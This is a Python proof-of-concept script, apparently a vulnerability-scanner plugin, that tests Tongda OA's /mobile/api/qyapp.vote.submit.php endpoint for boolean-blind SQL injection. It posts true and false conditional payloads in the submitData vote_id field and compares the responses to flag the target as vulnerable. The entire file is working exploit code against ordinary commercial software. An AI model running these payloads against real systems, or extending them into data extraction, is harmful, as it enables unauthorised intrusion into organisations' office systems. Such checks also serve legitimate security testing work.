import requests
import re, urllib

def verify(url):
    relsult = {
        'name': '通达OA sqli-布尔盲注(/mobile/api/qyapp.vote.submit.php)',
        'vulnerable': False,
        'attack': False,
        'url': url,
        'method': 'post',
        'position': 'data',
        'param': 'submitData',
    }
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = '/mobile/api/qyapp.vote.submit.php'
    vurl = urllib.parse.urljoin(url, payload)
    sqli_data_true = 'submitData={"a":{"vote_type":"1","vote_id":"if((select 995=995),1,2*1e308)","value":"1"}}'
    sqli_data_false = 'submitData={"a":{"vote_type":"1","vote_id":"if((select 3353=14451),1,2*1e308)","value":"1"}}'
    try:
        rep1 = requests.get(vurl, timeout=timeout, verify=False)
        if rep1.status_code == 200:
            true_rep = requests.post(vurl, headers=headers, data=sqli_data_true, timeout=timeout, verify=False)
            false_rep = requests.post(vurl, headers=headers, data=sqli_data_false, timeout=timeout, verify=False)
            if len(false_rep.text) > len(true_rep.text) and re.search("请联系管理员", false_rep.text):
                relsult['vulnerable'] = True
                relsult['vurl'] = vurl
                relsult['payload'] = sqli_data_true
        return relsult
    except:
        return relsult